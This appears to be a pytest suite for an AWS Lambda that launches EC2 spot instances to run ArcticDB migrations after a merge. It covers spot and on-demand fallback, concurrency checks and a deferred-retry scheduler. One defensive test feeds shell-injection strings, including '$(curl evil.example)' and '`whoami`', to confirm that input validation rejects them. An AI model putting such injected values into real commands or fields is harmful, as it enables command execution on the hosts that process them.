"""Unit tests for the merge-triggered ArcticDB migration spot dispatcher
(alpha-engine-config-I3242), including the defer-not-drop auto-retry
mechanism (config-I3254, adds a one-shot EventBridge Scheduler cycle).

Hermetic: ``nousergon_lib.ec2_spot`` and ``boto3`` are stubbed in sys.modules
BEFORE importing index (mirrors sf-watch-spot-dispatcher/test_handler.py —
index.py itself imports the REAL nousergon_lib.spot_dispatch, which resolves
its own `from nousergon_lib import ec2_spot` / `import boto3` against these
stubs). Validates:
- Normal launch arms the defer safety-net schedule.
- Deferred invocations read the S3 completion marker and act accordingly
  (recovered if marker not refused; defer again if still refused; exhaust at
  max generation).
- Deterministic schedule naming and ConflictException idempotency.
- The defer schedule is NOT created on concurrent_skip / probe_failed /
  launch_failed — only after a genuine successful launch.
"""

from __future__ import annotations

import importlib
import json
import os
import sys
import types
from io import BytesIO

import pytest

sys.path.insert(0, os.path.dirname(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))


# ── Stub nousergon_lib.ec2_spot + boto3 before importing index ─────────────────
class _SpotLaunchError(Exception):
    pass


class _SpotCapacityExhausted(_SpotLaunchError):
    pass


class _SpotQuotaExceededError(_SpotLaunchError):
    pass


def _install_stubs(launch_impl, boto_clients):
    ec2_spot_mod = types.ModuleType("nousergon_lib.ec2_spot")
    ec2_spot_mod.SpotLaunchError = _SpotLaunchError
    ec2_spot_mod.SpotCapacityExhausted = _SpotCapacityExhausted
    ec2_spot_mod.SpotQuotaExceededError = _SpotQuotaExceededError
    ec2_spot_mod.launch = launch_impl
    sys.modules["nousergon_lib.ec2_spot"] = ec2_spot_mod

    # boto3 stub: maps service name -> client for ec2, ssm, scheduler, s3
    boto3_mod = types.ModuleType("boto3")
    boto3_mod.client = lambda name, **kw: boto_clients[name]
    # Also expose the exceptions module so `boto3.client("s3").exceptions`
    # resolves; test callers must ensure the S3 stub's get_object raises a
    # type reachable via this attribute path.
    boto3_mod.exceptions = types.ModuleType("boto3.exceptions")
    sys.modules["boto3"] = boto3_mod
    sys.modules["boto3.exceptions"] = boto3_mod.exceptions


class _FakeWaiter:
    def wait(self, **kw):
        return None


class _FakeScheduler:
    """Stub for boto3.client('scheduler') — records created schedules,
    raises ConflictException for duplicate (name, head, gen) pairs."""

    def __init__(self):
        self.created = []
        self._existing = set()

    def create_schedule(self, **kw):
        name = kw["Name"]
        if name in self._existing:
            # Match the real boto3 ConflictException signature the deploy
            # handler catches via _is_scheduler_conflict.
            class _Conflict(Exception):
                def __init__(self):
                    super().__init__(name)
                    self.response = {"Error": {"Code": "ConflictException"}}
            raise _Conflict()
        self._existing.add(name)
        self.created.append(kw)
        return {"ScheduleArn": f"arn:aws:scheduler:us-east-1:711398986525:schedule/default/{name}"}


# Exception type shared between _FakeS3.exceptions.NoSuchKey and the stub's
# get_object raise — so the real handler's
# `except boto3.client("s3").exceptions.NoSuchKey` catches the stub's raise.
_FakeS3NoSuchKey = type("NoSuchKey", (Exception,), {})


class _FakeS3:
    """Stub for boto3.client('s3') — serves completion marker objects."""

    def __init__(self, markers: dict[str, dict] | None = None):
        self._markers = dict(markers or {})
        self.get_calls = []
        self.exceptions = type("exc", (), {"NoSuchKey": _FakeS3NoSuchKey})()

    def get_object(self, **kw):
        key = kw["Key"]
        self.get_calls.append((kw["Bucket"], key))
        body = self._markers.get(key)
        if body is None:
            raise _FakeS3NoSuchKey()
        return {"Body": BytesIO(json.dumps(body).encode("utf-8"))}


class _FakeContext:
    """Minimal stand-in for the Lambda context object — provides
    ``invoked_function_arn`` for the defer schedule's self-target + account-
    derived scheduler role ARN."""
    invoked_function_arn = (
        "arn:aws:lambda:us-east-1:711398986525:function:"
        "alpha-engine-arctic-migration-dispatcher"
    )


class _FakeEc2:
    def __init__(self, running_instances=None):
        self.terminated = []
        self._running_instances = dict(running_instances or {})

    def get_waiter(self, name):
        return _FakeWaiter()

    def terminate_instances(self, InstanceIds):  # noqa: N803 — boto3 kwarg name
        self.terminated.extend(InstanceIds)
        return {"TerminatingInstances": [{"InstanceId": i} for i in InstanceIds]}

    def describe_instances(self, Filters):  # noqa: N803 — boto3 kwarg name
        by_name = {f["Name"]: f["Values"] for f in Filters}
        head = by_name.get("tag:arctic-migration-head", [None])[0]
        ids = self._running_instances.get(head, [])
        return {"Reservations": [{"Instances": [{"InstanceId": i} for i in ids]}]} if ids else {"Reservations": []}


class _FakeSsm:
    def __init__(self):
        self.sent = []

    def describe_instance_information(self, **kw):
        return {"InstanceInformationList": [{"PingStatus": "Online"}]}

    def send_command(self, **kw):
        self.sent.append(kw)
        return {"Command": {"CommandId": "cmd-123"}}


def _load(monkeypatch, *, launch_impl=None, env=None, running_instances=None,
          scheduler=None, s3_markers=None):
    for k, v in (env or {}).items():
        monkeypatch.setenv(k, v)
    ssm = _FakeSsm()
    ec2 = _FakeEc2(running_instances=running_instances)
    sched = scheduler if scheduler is not None else _FakeScheduler()
    s3 = _FakeS3(markers=s3_markers)
    clients = {"ec2": ec2, "ssm": ssm, "scheduler": sched, "s3": s3}
    if launch_impl is None:
        launch_impl = lambda types_, subnets, **kw: "i-stub"  # noqa: E731
    _install_stubs(launch_impl, clients)

    from _shared.hermetic_import_guard import assert_hermetic_imports_satisfied

    assert_hermetic_imports_satisfied(__file__)
    if "nousergon_lib.spot_dispatch" in sys.modules:
        importlib.reload(sys.modules["nousergon_lib.spot_dispatch"])
    else:
        import nousergon_lib.spot_dispatch  # noqa: F401 — first import picks up the current stub

    _sd = sys.modules["nousergon_lib.spot_dispatch"]
    if not hasattr(_sd, "SpotProbeError"):
        _sd.SpotProbeError = type("SpotProbeError", (Exception,), {})

    import index

    importlib.reload(index)
    index._test_ssm = ssm
    index._test_ec2 = ec2
    index._test_scheduler = sched
    index._test_s3 = s3
    return index


def _event(**overrides):
    base = {
        "merged_sha": "a" * 40,
        "head_migration_number": 1,
    }
    base.update(overrides)
    return base


def test_valid_event_launches_spot_and_sends_async_ssm(monkeypatch):
    calls = {}

    def _launch(types_, subnets, **kw):
        calls["spot"] = kw.get("spot")
        calls["profile"] = kw.get("iam_instance_profile")
        calls["tag_name"] = kw.get("tag_name")
        return "i-abc"

    idx = _load(monkeypatch, launch_impl=_launch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(), None)
    assert out["launched"] is True
    assert out["reason"] == "launched"
    assert out["instance_id"] == "i-abc"
    assert out["market"] == "spot"
    assert out["command_id"] == "cmd-123"
    assert out["head_migration_number"] == 1
    assert out["merged_sha"] == "a" * 40
    assert calls["spot"] is True
    assert calls["profile"] == "alpha-engine-executor-profile"
    assert calls["tag_name"] == "alpha-engine-arctic-migration-spot"
    assert idx._test_ec2.terminated == []

    sent = idx._test_ssm.sent[0]
    cmd = sent["Parameters"]["commands"][0]
    assert f"git fetch --quiet --depth 1 origin {'a' * 40}" in cmd
    assert f"git checkout --quiet {'a' * 40}" in cmd
    assert f"python scripts/run_arctic_migrations.py --merged-sha {'a' * 40}" in cmd
    assert "--head-migration-number 1" in cmd
    assert sent["Parameters"]["executionTimeout"] == [str(idx.MAX_RUNTIME_SECONDS)]


def test_on_demand_fallback_on_spot_capacity_exhaustion(monkeypatch):
    seen = []

    def _launch(types_, subnets, **kw):
        seen.append(kw.get("spot"))
        if kw.get("spot"):
            raise _SpotCapacityExhausted("no capacity in any pool")
        return "i-ondemand"

    idx = _load(monkeypatch, launch_impl=_launch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(), None)
    assert out["launched"] is True
    assert out["market"] == "on-demand"
    assert out["instance_id"] == "i-ondemand"
    assert seen == [True, False]


def test_total_launch_exhaustion_returns_clean_false_not_raise(monkeypatch):
    def _launch(types_, subnets, **kw):
        raise _SpotCapacityExhausted("exhausted everywhere")

    idx = _load(monkeypatch, launch_impl=_launch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(), None)
    assert out["launched"] is False
    assert out["reason"] == "launch_failed"
    assert "exhausted everywhere" in out["error"]
    assert idx._test_ssm.sent == []


def test_concurrent_skip_for_same_head_no_launch(monkeypatch):
    launched = []

    def _launch(types_, subnets, **kw):
        launched.append(True)
        return "i-new"

    idx = _load(
        monkeypatch, launch_impl=_launch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
        running_instances={"1": ["i-already-running"]},
    )
    out = idx.handler(_event(head_migration_number=1), None)
    assert out["launched"] is False
    assert out["reason"] == "concurrent_skip"
    assert out["existing_instance_ids"] == ["i-already-running"]
    assert launched == []


def test_different_head_is_not_blocked(monkeypatch):
    idx = _load(
        monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-new",  # noqa: E731
        env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
        running_instances={"1": ["i-other-head"]},
    )
    out = idx.handler(_event(head_migration_number=2), None)
    assert out["launched"] is True
    assert out["instance_id"] == "i-new"


def test_concurrency_probe_failure_refuses_fail_closed(monkeypatch):
    """DELIBERATE POSTURE DIFFERENCE from sf-watch's site-1 policy (coverage
    beats dedupe): a migration full-rewrite racing a duplicate box is a
    correctness risk, so a broken probe here REFUSES rather than launching
    anyway."""
    idx = _load(
        monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-should-not-launch",  # noqa: E731
        env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
    )

    def _boom(Filters):  # noqa: N803 — boto3 kwarg name
        raise RuntimeError("EC2 API hiccup")

    idx._test_ec2.describe_instances = _boom
    out = idx.handler(_event(), None)
    assert out["launched"] is False
    assert out["reason"] == "probe_failed"
    assert idx._test_ssm.sent == []


def test_post_launch_ssm_failure_terminates_instance_returns_clean_false(monkeypatch):
    idx = _load(
        monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-orphan",  # noqa: E731
        env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
    )

    def _boom_send(**kw):
        raise RuntimeError("SSM SendCommand failed")

    idx._test_ssm.send_command = _boom_send
    out = idx.handler(_event(), None)
    assert out["launched"] is False
    assert out["reason"] == "post_launch_failed"
    assert out["instance_id"] == "i-orphan"
    assert idx._test_ec2.terminated == ["i-orphan"]


def test_malformed_merged_sha_returns_clean_false(monkeypatch):
    idx = _load(monkeypatch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(merged_sha="not-a-sha"), None)
    assert out["launched"] is False
    assert out["reason"] == "invalid_event"
    assert idx._test_ssm.sent == []


def test_missing_head_migration_number_returns_clean_false(monkeypatch):
    idx = _load(monkeypatch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"})
    event = _event()
    del event["head_migration_number"]
    out = idx.handler(event, None)
    assert out["launched"] is False
    assert out["reason"] == "invalid_event"


def test_malformed_head_migration_number_returns_clean_false(monkeypatch):
    idx = _load(monkeypatch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"})
    out = idx.handler(_event(head_migration_number="not-a-number"), None)
    assert out["launched"] is False
    assert out["reason"] == "invalid_event"


def test_disabled_flag_short_circuits(monkeypatch):
    idx = _load(monkeypatch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "false"})
    out = idx.handler(_event(), None)
    assert out["launched"] is False
    assert out["reason"] == "disabled"
    assert idx._test_ssm.sent == []


def test_cause_free_merged_sha_never_appears_unquoted_dangerously(monkeypatch):
    """Defense-in-depth: the SHA allowlist (_SHA_RE, 40 hex chars after
    lowercasing) rules out shell-metacharacter injection outright — a
    malformed value never reaches the constructed SSM command at all (see
    test_malformed_merged_sha_returns_clean_false). Note: a 40-char
    UPPERCASE-hex sha is deliberately normalized (lowercased) before
    validation, not rejected — see test_uppercase_merged_sha_is_normalized."""
    idx = _load(monkeypatch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"})
    for dangerous in ('$(curl evil.example)', '`whoami`', 'a' * 39, 'not-a-sha-at-all'):
        out = idx.handler(_event(merged_sha=dangerous), None)
        assert out["launched"] is False
        assert out["reason"] == "invalid_event"


def test_uppercase_merged_sha_is_normalized_not_rejected(monkeypatch):
    idx = _load(
        monkeypatch, launch_impl=lambda types_, subnets, **kw: "i-stub",  # noqa: E731
        env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
    )
    out = idx.handler(_event(merged_sha="A" * 40), None)
    assert out["launched"] is True
    assert out["merged_sha"] == "a" * 40


# ── Defer-not-drop tests (config-I3254 / config#2226) ───────────────────────


def test_normal_launch_arms_defer_schedule(monkeypatch):
    """A normal (non-deferred) launch creates a one-shot defer schedule that
    re-checks the completion marker after DEFER_DELAY_SECONDS."""
    idx = _load(
        monkeypatch, launch_impl=lambda *a, **kw: "i-arms-schedule",
        env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
    )
    out = idx.handler(_event(), _FakeContext())
    assert out["launched"] is True
    assert out["reason"] == "launched"
    # One defer schedule should have been created
    assert len(idx._test_scheduler.created) == 1
    sched = idx._test_scheduler.created[0]
    assert sched["ActionAfterCompletion"] == "DELETE"
    assert sched["Name"].startswith("arctic-migration-defer-")
    assert "defer_generation" in sched["Target"]["Input"]
    payload = json.loads(sched["Target"]["Input"])
    assert payload["defer_generation"] == 1
    assert payload["merged_sha"] == "a" * 40
    assert payload["head_migration_number"] == 1


def test_deferred_invocation_with_refused_marker_launches_and_arms_next(monkeypatch):
    """Deferred re-invoke (defer_generation=1) with a refused_mutex_active
    marker: creates a safety-net schedule for gen=2, THEN launches a fresh
    box (falls through to the normal launch path)."""
    head = 1
    marker_key = f"overseer/_control/completed/arctic-migration-{head:04d}.json"
    markers = {
        marker_key: {
            "state": "refused_mutex_active", "rc": 0,
            "merged_sha": "a" * 40, "running_pipelines": ["ne-weekly-freshness-pipeline"],
        }
    }
    idx = _load(
        monkeypatch, launch_impl=lambda *a, **kw: "i-deferred-relaunch",
        env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
        s3_markers=markers,
    )
    out = idx.handler(
        _event(defer_generation=1, head_migration_number=head), _FakeContext(),
    )
    assert out["launched"] is True
    assert out["reason"] == "launched"
    assert out["instance_id"] == "i-deferred-relaunch"
    # Safety-net schedule for gen=2 was created, AND the box was launched
    scheds = [s for s in idx._test_scheduler.created
              if "defer_generation" in s["Target"]["Input"]]
    assert len(scheds) >= 1
    last_payload = json.loads(scheds[-1]["Target"]["Input"])
    assert last_payload["defer_generation"] == 2


def test_deferred_invocation_recovered_when_marker_not_refused(monkeypatch):
    """Deferred re-invoke with a success marker returns recovered — no
    further action, no new schedule, no launch."""
    head = 1
    marker_key = f"overseer/_control/completed/arctic-migration-{head:04d}.json"
    markers = {
        marker_key: {
            "state": "success", "rc": 0,
            "merged_sha": "a" * 40, "applied_migrations": [1],
        }
    }
    idx = _load(
        monkeypatch, launch_impl=lambda *a, **kw: "i-should-not-launch",
        env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
        s3_markers=markers,
    )
    out = idx.handler(
        _event(defer_generation=1, head_migration_number=head), _FakeContext(),
    )
    assert out["launched"] is False
    assert out["reason"] == "recovered"
    assert out["marker_state"] == "success"
    # No defer schedule should have been created
    assert idx._test_scheduler.created == []


def test_deferred_invocation_recovered_when_no_marker(monkeypatch):
    """Deferred re-invoke with no completion marker yet (box still running)
    returns recovered — don't interfere."""
    idx = _load(
        monkeypatch, launch_impl=lambda *a, **kw: "i-should-not-launch",
        env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
        s3_markers={},  # no markers at all
    )
    out = idx.handler(_event(defer_generation=1), _FakeContext())
    assert out["launched"] is False
    assert out["reason"] == "recovered"
    assert out["marker_state"] is None
    assert idx._test_scheduler.created == []


def test_deferred_invocation_recovered_for_failure_marker(monkeypatch):
    """Deferred re-invoke with a failure marker returns recovered — the
    migration already ran and failed; no further auto-retry."""
    head = 1
    marker_key = f"overseer/_control/completed/arctic-migration-{head:04d}.json"
    markers = {
        marker_key: {
            "state": "failure", "rc": 1,
            "merged_sha": "a" * 40, "failed_migration_number": 1,
            "error": "MigrationError: something broke",
        }
    }
    idx = _load(
        monkeypatch, launch_impl=lambda *a, **kw: "i-should-not-launch",
        env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
        s3_markers=markers,
    )
    out = idx.handler(
        _event(defer_generation=1, head_migration_number=head), _FakeContext(),
    )
    assert out["launched"] is False
    assert out["reason"] == "recovered"
    assert out["marker_state"] == "failure"


def test_deferred_exhaustion_at_max_generation(monkeypatch):
    """Deferred re-invoke at generation == DEFER_MAX_GENERATION (3) with
    the marker still refusing: returns defer_exhausted — no schedule, no
    launch."""
    head = 1
    marker_key = f"overseer/_control/completed/arctic-migration-{head:04d}.json"
    markers = {
        marker_key: {
            "state": "refused_mutex_active", "rc": 0,
            "merged_sha": "a" * 40, "running_pipelines": ["ne-preopen-trading-pipeline"],
        }
    }
    idx = _load(
        monkeypatch, launch_impl=lambda *a, **kw: "i-should-not-launch",
        env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
        s3_markers=markers,
    )
    # DEFER_MAX_GENERATION=3, so gen=3 is the exhaust boundary
    out = idx.handler(
        _event(defer_generation=3, head_migration_number=head), _FakeContext(),
    )
    assert out["launched"] is False
    assert out["reason"] == "defer_exhausted"
    assert out["defer_generation"] == 3
    # No new schedule was created
    assert idx._test_scheduler.created == []


def test_defer_schedule_name_deterministic_within_aws_cap(monkeypatch):
    """_defer_schedule_name is deterministic for the same (head, gen) and
    stays within AWS' 64-char Name limit."""
    idx = _load(monkeypatch, env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"})
    name_a = idx._defer_schedule_name(1, 1)
    name_b = idx._defer_schedule_name(1, 1)
    assert name_a == name_b
    assert name_a == "arctic-migration-defer-0001-g1"
    assert len(name_a) <= 64

    name_c = idx._defer_schedule_name(999999, 3)
    assert name_c.startswith("arctic-migration-defer-")
    assert len(name_c) <= 64

    # Different (head, gen) produces a different name
    name_d = idx._defer_schedule_name(2, 1)
    assert name_d != name_a


def test_defer_schedule_conflict_treated_as_already_deferred(monkeypatch):
    """A duplicate _schedule_defer_check call for the same (head, gen) hits
    ConflictException and is logged as already-scheduled — the existing
    schedule survives, and the launch still proceeds."""
    head = 1
    marker_key = f"overseer/_control/completed/arctic-migration-{head:04d}.json"
    markers = {
        marker_key: {
            "state": "refused_mutex_active", "rc": 0,
            "merged_sha": "a" * 40, "running_pipelines": ["ne-weekly-freshness-pipeline"],
        }
    }
    idx = _load(
        monkeypatch, launch_impl=lambda *a, **kw: "i-conflict",
        env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
        s3_markers=markers,
    )
    # First invocation: creates gen=2 schedule, then launches
    out1 = idx.handler(
        _event(defer_generation=1, head_migration_number=head), _FakeContext(),
    )
    assert out1["launched"] is True
    assert len(idx._test_scheduler.created) == 1  # gen=2 schedule created

    # Second invocation with the same gen=1: _schedule_defer_check for gen=2
    # should hit ConflictException and log it
    out2 = idx.handler(
        _event(defer_generation=1, head_migration_number=head), _FakeContext(),
    )
    assert out2["launched"] is True
    # No NEW schedule created — the existing gen=2 schedule covers it
    assert len(idx._test_scheduler.created) == 1


def test_defer_schedule_not_created_on_concurrent_skip(monkeypatch):
    """A concurrent_skip (box already live for this head) does NOT create a
    defer schedule — no box was launched."""
    idx = _load(
        monkeypatch, launch_impl=lambda *a, **kw: "i-should-not-launch",
        env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
        running_instances={"1": ["i-already-running"]},
    )
    out = idx.handler(_event(head_migration_number=1), _FakeContext())
    assert out["launched"] is False
    assert out["reason"] == "concurrent_skip"
    assert idx._test_scheduler.created == []


def test_defer_schedule_not_created_on_launch_failure(monkeypatch):
    """A launch failure does NOT create a defer schedule."""
    def _boom(*a, **kw):  # noqa: E731
        raise _SpotLaunchError("all pools exhausted")

    idx = _load(
        monkeypatch, launch_impl=_boom,
        env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
    )
    out = idx.handler(_event(), _FakeContext())
    assert out["launched"] is False
    assert out["reason"] == "launch_failed"
    assert idx._test_scheduler.created == []


def test_deferred_invocation_schedule_failure_returns_error(monkeypatch):
    """If _schedule_defer_check fails (e.g. no context), _handle_deferred
    returns defer_schedule_failed rather than silently dropping the retry."""
    head = 1
    marker_key = f"overseer/_control/completed/arctic-migration-{head:04d}.json"
    markers = {
        marker_key: {
            "state": "refused_mutex_active", "rc": 0,
            "merged_sha": "a" * 40, "running_pipelines": ["ne-weekly-freshness-pipeline"],
        }
    }
    idx = _load(
        monkeypatch, launch_impl=lambda *a, **kw: "i-not-relevant",
        env={"ARCTIC_MIGRATION_DISPATCH_ENABLED": "true"},
        s3_markers=markers,
    )
    # Pass None as context — _schedule_defer_check fails because
    # context.invoked_function_arn is empty. _handle_deferred returns
    # defer_schedule_failed rather than proceeding silently.
    out = idx.handler(
        _event(defer_generation=1, head_migration_number=head), None,
    )
    assert out["launched"] is False
    assert out["reason"] == "defer_schedule_failed"
    assert "no invoked_function_arn" in out.get("error", "").lower()
